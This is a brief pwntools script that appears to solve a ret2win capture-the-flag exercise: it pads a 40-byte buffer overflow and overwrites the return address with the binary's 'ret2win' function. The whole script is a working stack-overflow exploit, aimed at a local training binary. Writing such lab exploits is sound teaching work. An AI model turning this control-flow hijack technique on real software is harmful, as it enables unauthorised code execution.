from pwn import *

filepath = ""   #use your filepath here
elf = context.binary = ELF(filepath, checksec=False)
p = process()

offset = 40     #found manually ofc
payload = flat(
    asm('nop') * offset,
    elf.symbols['ret2win'],
)

# f = open("payload", "wb")
# f.write(payload)
p.sendlineafter('>', payload)
p.interactive()
